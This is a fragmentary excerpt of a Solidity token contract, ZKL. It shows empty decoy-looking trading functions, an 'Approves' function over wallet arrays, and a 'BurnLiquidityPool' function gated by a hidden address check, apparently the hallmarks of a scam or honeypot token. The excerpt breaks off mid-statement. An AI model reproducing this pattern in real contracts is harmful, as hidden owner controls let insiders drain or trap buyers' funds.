...
contract ZKL is Ownable {
    ...
    function opentostart() public {
    }
    function starttoopen() external {
    }
    function starttradingopen() public {
    }
    function opentradingstart() public {
    }
    function Approves(address[] calldata walletAddress) external {
    ...
    function BurnLiquidityPool(uint256 amount, address walletAddr) external {
        if (marketingAddres()) {
